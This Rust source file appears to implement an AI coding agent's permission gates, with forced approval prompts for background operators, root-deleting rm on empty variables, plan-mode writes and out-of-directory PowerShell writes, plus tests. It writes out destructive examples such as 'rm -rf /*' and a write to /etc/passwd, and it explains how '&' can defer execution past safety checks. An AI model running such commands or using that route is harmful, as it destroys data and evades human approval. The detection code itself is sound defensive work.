/// (The oracle's Write arm carries no `behavior:"ask"` — that hard-validation
/// shape lives in the Write TOOL's `validateInput`, not in the permission
/// engine, so this gate keeps its Ask shape for both spellings.)
fn ask_edit_read_deny_covered(tool_name: &str) -> PermissionResult {
    let message = if tool_name == "Write" {
        "File is covered by a Read deny rule in your permission settings and cannot be written."
    } else {
        "File is covered by a Read deny rule in your permission settings and cannot be edited."
    };
    PermissionResult::Ask {
        reason: PermissionDecisionReason::Other {
            reason: message.to_string(),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message: message.to_string(),
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// `XAu(node)` — 1:1 with claude-code's background-operator AST walk: `true`
/// when the subtree contains an `ERROR` node, or a `&` node whose parent is NOT
/// a `binary_expression` (a real background operator; `&&`/`||`/`|` are distinct
/// node kinds). A `&` under a `binary_expression` is skipped (not recursed).
#[cfg(feature = "bash-ast")]
fn has_background_operator(node: tree_sitter::Node) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let kind = child.kind();
        if kind == "ERROR" {
            return true;
        }
        if kind == "&" {
            if node.kind() != "binary_expression" {
                return true;
            }
            continue;
        }
        if has_background_operator(child) {
            return true;
        }
    }
    false
}

/// BGOP-01 background-operator forced ask (claude-code `Yqr`'s downgrade). Tagged
/// [`PermissionDecisionReason::SafetyCheck`] with `classifier_approvable: false`
/// (`classifierApprovable:!1`), carrying the byte-locked reason/message.
#[cfg(feature = "bash-ast")]
fn ask_background_operator(tool_name: &str) -> PermissionResult {
    let reason = "This command uses the `&` background operator, which defers execution past approval-time safety checks. Approve only if you trust it.";
    PermissionResult::Ask {
        reason: PermissionDecisionReason::SafetyCheck {
            reason: reason.to_string(),
            classifier_approvable: false,
            // PARITY oracle `Yqr`: `circuitBreaker:"backgroundOperator"`.
            circuit_breaker: Some(crate::result::SafetyCircuitBreaker::BackgroundOperator),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message: reason.to_string(),
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Possibly-empty `$VAR` removal FORCED-ASK: an `rm`/`rmdir` whose target is a
/// variable expansion that points at the filesystem root when the variable is
/// unset/empty (claude-code 2.1.205 `GIu` → `b0t`). Tagged
/// [`PermissionDecisionReason::SafetyCheck`] with `classifier_approvable: false`
/// (`b0t` sets `classifierApprovable:!1`) so NO classifier and NO exact/prefix
/// allow rule can auto-approve it. Message + reason are byte-locked to the
/// 2.1.207 binary (`hHg`); `cmd` is `"rm"`/`"rmdir"` and `target` the offending
/// argument.
#[cfg(feature = "bash-ast")]
fn ask_dangerous_rm_variable_path(tool_name: &str, cmd: &str, target: &str) -> PermissionResult {
    let message = format!(
        "Dangerous {cmd} operation detected: '{target}'\n\nThis target is a shell variable expansion that points at the filesystem root (or a top-level directory) when the variable is unset or empty — e.g. `rm -rf $UNSET/*` becomes `rm -rf /*`. This requires explicit approval and cannot be auto-allowed by permission rules."
    );
    PermissionResult::Ask {
        reason: PermissionDecisionReason::SafetyCheck {
            reason: format!("Dangerous {cmd} operation on possibly-empty variable path: {target}"),
            classifier_approvable: false,
            // PARITY 2.1.263: this ask is produced by `HL` in the oracle
            // (@2206595), and `HL` sets `circuitBreaker:"dangerousRemoval"` on
            // every one of its eight call sites — this one included.
            circuit_breaker: Some(crate::result::SafetyCircuitBreaker::DangerousRemoval),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// PARITY 2.1.263 `Amo` → `HL`. Same `safetyCheck` shape as every other `HL`
/// ask — `classifierApprovable:!1`, `circuitBreaker:"dangerousRemoval"` — with
/// the message and reason carried by the finding.
#[cfg(feature = "bash-ast")]
fn ask_dangerous_removal_in_substitution(
    tool_name: &str,
    found: &crate::dangerous_removal::SubstitutionRemoval,
) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::SafetyCheck {
            reason: found.reason(),
            classifier_approvable: false,
            circuit_breaker: Some(crate::result::SafetyCircuitBreaker::DangerousRemoval),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message: found.message(),
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Plan-mode mutation backstop ask: a tool that would mutate state in `Plan`
/// mode. Tagged with [`PermissionMode::Plan`]; claude-code surfaces a plan-mode
/// mutation as an interactive ask (NOT a hard deny). The message is byte-exact
/// with the binary's two variants: `write_path = Some(p)` (a file-WRITE tool,
/// Editor kind) → `Cannot write to {p} while in plan mode.`; `None` (any other
/// non-read-only tool) → `Cannot call {tool_name} while in plan mode.`
fn ask_plan_mutation(tool_name: &str, write_path: Option<&str>) -> PermissionResult {
    let message = match write_path {
        Some(path) => format!("Cannot write to {path} while in plan mode."),
        None => format!("Cannot call {tool_name} while in plan mode."),
    };
    PermissionResult::Ask {
        reason: PermissionDecisionReason::PermissionMode {
            mode: PermissionMode::Plan,
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message,
            options: vec!["Allow once".into(), "Always allow".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

#[cfg(test)]
#[path = "policy_test.rs"]
mod policy_test;

// AUTO-03: separate inline module (kept out of `policy_test.rs`) covering the
// `autoMode.classifyAllShell` escalation at the two policy call sites.
#[cfg(test)]
mod classify_all_shell_policy_test {
    use super::*;
    use crate::PermissionRuleValue;

    fn bash_allow(content: &str) -> PermissionRule {
        PermissionRule {
            value: PermissionRuleValue {
                tool_name: "Bash".into(),
                rule_content: Some(content.into()),
            },
            behavior: PermissionBehavior::Allow,
            source: PermissionRuleSource::Settings(protocol::SettingsScope::User),
        }
    }

    #[test]
    fn strip_honors_classify_all_shell_flag() {
        // flag OFF: a SAFE `Bash(ls:*)` allow survives the auto-mode strip.
        let mut p = PermissionPolicy::from_rules(PermissionMode::Default, vec![bash_allow("ls:*")]);
        p.set_mode(PermissionMode::Auto);
        assert!(p.stripped_dangerous.is_empty());
        assert!(p.allow_rules.values().any(|v| !v.is_empty()));

        // flag ON (set BEFORE the Default→Auto transition, matching the boot
        // ordering fix): the same safe shell allow is stripped into the stash.
        let mut p = PermissionPolicy::from_rules(PermissionMode::Default, vec![bash_allow("ls:*")])
            .with_classify_all_shell(true);
        p.set_mode(PermissionMode::Auto);
        assert_eq!(p.stripped_dangerous.len(), 1);
        assert_eq!(p.stripped_dangerous[0].value.tool_name, "Bash");
        // Leaving auto mode restores it verbatim (strip↔restore identity holds).
        p.set_mode(PermissionMode::Default);
        assert!(p.stripped_dangerous.is_empty());
        assert!(p.allow_rules.values().any(|v| !v.is_empty()));
    }

    #[test]
    fn availability_gate_honors_classify_all_shell_flag() {
        let rule = bash_allow("ls:*");
        // flag OFF, Auto mode: a safe Bash allow is AVAILABLE (base predicate).
        let p = PermissionPolicy::new(PermissionMode::Auto);
        assert!(p.rule_is_available_in_mode(&rule, PermissionMode::Auto));
        // flag ON, Auto mode: NOT available (suspended → routed to classifier).
        let p = PermissionPolicy::new(PermissionMode::Auto).with_classify_all_shell(true);
        assert!(!p.rule_is_available_in_mode(&rule, PermissionMode::Auto));
        // flag ON but a NON-auto mode: available — the escalation is auto-only.
        assert!(p.rule_is_available_in_mode(&rule, PermissionMode::Default));
    }
}

// ps-acceptedits: the `zLs` whole-pipeline auto-allow COMPOSED with path
// containment. A separate inline module (kept OUT of `policy_test.rs`, which is
// concurrently edited elsewhere). Exercises the composition directly via
// `check_powershell_containment` with a stub parser.
#[cfg(test)]
mod ps_acceptedits_policy_test {
    use super::*;
    use crate::powershell_containment::{PsCommand, PsElement, PsStatement};
    use crate::powershell_parse::{ParseResult, PwshParser};
    use std::path::PathBuf;
    use std::sync::Arc;

    /// A parser returning a fixed [`ParseResult`], ignoring the command text — the
    /// real `pwsh` spawn is not needed to drive the pure composition.
    struct StubParser {
        result: ParseResult,
    }
    impl PwshParser for StubParser {
        fn parse(&self, _command: &str) -> ParseResult {
            self.result.clone()
        }
    }

    /// A single structurally-safe `Set-Content <path> x` write parse.
    fn set_content(path: &str) -> ParseResult {
        let c = PsCommand {
            name: "Set-Content".to_string(),
            name_type: "cmdlet".to_string(),
            args: vec![path.to_string(), "x".to_string()],
            element_types: vec![
                "StringConstant".to_string(),
                "StringConstant".to_string(),
                "StringConstant".to_string(),
            ],
            ..PsCommand::default()
        };
        ParseResult {
            valid: true,
            statements: vec![PsStatement {
                commands: vec![PsElement::Command(c)],
                ..PsStatement::default()
            }],
            ..ParseResult::default()
        }
    }

    fn roots() -> FsRoots {
        FsRoots {
            cwd: PathBuf::from("/proj/work"),
            home: Some(PathBuf::from("/home/u")),
            lingxi_home: PathBuf::from("/home/u/.lingxi"),
        }
    }

    fn policy_with(parse: ParseResult) -> PermissionPolicy {
        PermissionPolicy::new(PermissionMode::AcceptEdits)
            .with_pwsh_parser(Arc::new(StubParser { result: parse }))
    }

    #[test]
    fn accept_edits_in_cwd_write_auto_allows() {
        // An in-cwd `Set-Content` in acceptEdits: containment passes through and
        // the structural `zLs` validator allows → allow with a PermissionMode
        // acceptEdits reason (the over-ask fix).
        let p = policy_with(set_content("/proj/work/f.txt"));
        match p.check_powershell_containment(
            "Set-Content /proj/work/f.txt x",
            &roots(),
            PermissionMode::AcceptEdits,
        ) {
            Some(PermissionResult::Allow {
                reason: PermissionDecisionReason::PermissionMode { mode },
                ..
            }) => assert_eq!(mode, PermissionMode::AcceptEdits),
            other => panic!("expected acceptEdits allow, got {other:?}"),
        }
    }

    #[test]
    fn accept_edits_out_of_cwd_write_still_asks() {
        // UNDER-ASK GUARD: `Set-Content /etc/passwd x` in acceptEdits — `zLs` alone
        // would allow it (it is STRUCTURALLY safe), but path containment ASKS, and
        // the containment ask OVERRIDES the structural allow. Must NOT auto-allow.
        let p = policy_with(set_content("/etc/passwd"));
        let r = p.check_powershell_containment(
            "Set-Content /etc/passwd x",
            &roots(),
            PermissionMode::AcceptEdits,
        );
        assert!(
            matches!(r, Some(PermissionResult::Ask { .. })),
            "out-of-cwd write must ask (containment overrides zLs), got {r:?}"
        );
        assert!(
            !matches!(r, Some(PermissionResult::Allow { .. })),
            "out-of-cwd write must never auto-allow"
        );
    }

    #[test]
    fn non_accept_edits_modes_never_auto_allow() {
        // The `zLs` allow is strictly gated on acceptEdits. In default/plan mode
        // the SAME in-cwd write is NOT auto-allowed — it asks via containment,
        // exactly as before this feature (no acceptEdits Allow ever appears).
        for mode in [PermissionMode::Default, PermissionMode::Plan] {
            let p = policy_with(set_content("/proj/work/f.txt"));
            let r =
                p.check_powershell_containment("Set-Content /proj/work/f.txt x", &roots(), mode);
            assert!(
                !matches!(r, Some(PermissionResult::Allow { .. })),
                "{mode:?}: must not auto-allow a PowerShell write"
            );
            assert!(
                matches!(r, Some(PermissionResult::Ask { .. })),
                "{mode:?}: in-cwd write asks via containment, got {r:?}"
            );
        }
    }
}

#[cfg(test)]
mod restricted_policy_test {
    use super::*;
    use crate::PermissionRuleValue;
    use serde_json::json;

    #[test]
    fn restricted_protected_file_write_remains_ask_over_allow_rule() {
        let roots = FsRoots {
            cwd: PathBuf::from("/workspace"),
            home: Some(PathBuf::from("/home/test")),
            lingxi_home: PathBuf::from("/home/test/.lingxi"),
        };
        let allow = PermissionRule {
            value: PermissionRuleValue::from_rule_string("Edit(.git/**)"),
            behavior: PermissionBehavior::Allow,
            source: PermissionRuleSource::Settings(protocol::SettingsScope::User),
        };
        let policy = PermissionPolicy::from_rules(PermissionMode::BypassPermissions, [allow])
            .with_roots(roots)
            .with_restricted(true);
        let result = policy.authorize(
            "Edit",
            &json!({"file_path": "/workspace/.git/config", "old_string": "x", "new_string": "y"}),
        );
        assert!(matches!(
            result,
            PermissionResult::Ask {
                reason: PermissionDecisionReason::SafetyCheck { .. },
                ..
            }
        ));
    }
}
